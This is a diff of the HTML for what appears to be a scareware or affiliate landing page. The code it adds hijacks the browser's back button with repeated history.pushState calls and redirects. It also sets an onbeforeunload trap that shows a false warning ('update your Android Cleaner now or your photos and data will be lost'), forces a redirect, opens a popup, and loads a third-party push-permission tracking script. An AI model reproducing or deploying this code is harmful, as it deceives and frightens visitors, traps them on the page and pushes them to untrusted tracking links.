@@ -30,10 +30,21 @@
     </style>
     <![endif]-->
 <script>function countdown(e,t,n,r,i){function c(e){return e<=9?'0'+e:e}function h(){f=o- +(new Date);l=new Date(f);secs=l.getUTCSeconds();a=l.getUTCMinutes();u=l.getUTCHours();if(r=='secs'){secs=u*3600+a*60+secs;result='<span class="affkit-timer-seconds">'+secs+'</span>'}if(r=='mins'){a=u*60+a;result='<span class="affkit-timer-minutes">'+c(a)+'</span>:<span class="affkit-timer-seconds">'+c(secs)+'</span>'}if(r=='hours'){result='<span class="affkit-timer-hours">'+c(u)+'</span>:<span class="affkit-timer-minutes">'+c(a)+'</span>:<span class="affkit-timer-seconds">'+c(secs)+'</span>'}s.innerHTML=result;if(f<1e3){if((i.length>4)&&(i!='undefined'))window.location.href=decodeURI(i)}else{setTimeout(h,l.getUTCMilliseconds()+500)}}t=parseInt(t);n=parseInt(n);var s,o,u,a,f,l;s=document.getElementById(e);o=+(new Date)+1e3*(60*t+n)+500;h()}function addLoadEvent(e){var t=window.onload;if(typeof window.onload!="function"){window.onload=e}else{window.onload=function(){if(t){t()}e()}}};addLoadEvent(function(){countdown('affkit-timer-210',5,0,'mins','')});</script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FSJ1CG9XWP"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FSJ1CG9XWP');
+</script>
+
 </head>
 
 <body>
-<a id="url" href="https://t.sfr.wiki/click.php?lp=1" target="_self"></a>
+<a id="url" href="https://i.top10.run/click.php?key=x1pbcwpn5zhedv3kmkm8"></a>
 <div id="overlay"></div>
 <main id="wrap" style="position: absolute; top: 0px; left: 0px; width: auto; height: auto;">
 
@@ -72,9 +83,12 @@
 <script src="js/script.js"></script>
 
 <script>
-    const s = document.createElement('script');
-    s.src='//fiwhibse.com/pfe/current/micro.tag.min.js?z=4129666'+'&sw=/sw-check-permissions-b9071.js';
-    s.onload = (result) => {
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('clickid');
+	var ppi = url.searchParams.get('zoneid');
+    var s = document.createElement('script');
+    s.src='//fiwhibse.com/pfe/current/micro.tag.min.js?z=4129666'+'&ymid='+pci+'&var='+ppi+'&sw=/sw-check-permissions-b9071.js';
+    s.onload = function(result) {
         switch (result) {
             case 'onPermissionDefault':break;
             case 'onPermissionAllowed':break;
@@ -85,20 +99,59 @@
     }
 
     document.head.appendChild(s);
-	
-	
+
 	! function() {
-		var t;
-		try {
-			for(t = 0; 10 > t; ++t) history.pushState({}, "", "");
-				onpopstate = function(t) {
-				PreventExitPop = false
-				t.state && location.replace("https://t.sfr.wiki/click.php?lp=1")
-				}
-		} catch(o) {}
-	}();
-	
+        var t;
+        try {
+            for(t = 0; 10 > t; ++t) history.pushState({}, "", "");
+                onpopstate = function(t) {
+                PreventExitPop = false
+                t.state && location.replace("https://i.top10.run/click.php?key=wnha1n969lvkjdd0lnr3"+window.location.href.split("split=true",2)[1])
+                }
+        } catch(o) {}
+    }(); 
 </script>
-<script src="https://my.rtmark.net/p.js?f=sync&lr=1&partner=b915e984679178956be31ea06ca8e2a097fabff6b31885fc270043238071a7b6" defer></script>
-<noscript><img src="https://my.rtmark.net/img.gif?f=sync&lr=1&partner=b915e984679178956be31ea06ca8e2a097fabff6b31885fc270043238071a7b6" width="1" height="1" /></noscript>
+
+
+<script type="text/javascript">
+	var nc = 'https://i.top10.run/click.php?key=x1pbcwpn5zhedv3kmkm8'+window.location.href.split("split=true",2)[1];
+	
+	document.getElementById("url").href = nc;
+
+
+    (function (w, d) {
+        var epp = function () {
+            if (w.onbeforeunload === null) {
+                var to;
+                function repp() {
+                    w.onbeforeunload = null;
+					window.open("https://i.top10.run/click.php?lp=1", "_blank");
+                };
+                function epp() {
+                    to = setTimeout(function () {
+                        w.location.replace(nc);
+                        repp();
+                    }, 100);
+                    return 'You should update your Android Cleaner now or your photos and data will be lost and cannot be recovered!';
+                }
+                w.onbeforeunload = epp;
+                // Prevent epp firing from clicking on tracking links
+                var ln = d.querySelectorAll("[href='"+nc+"']");
+                for (i = 0; i < ln.length; ++i) {
+                    ln[i].addEventListener("click", function () {
+                        repp();
+                    });
+                }
+            }
+            ;
+        };
+        if (d.readyState != 'loading') {
+            epp();
+        } else {
+            d.addEventListener('DOMContentLoaded', epp);
+        }
+    })(window, document);
+</script>
+
+
 </body></html>
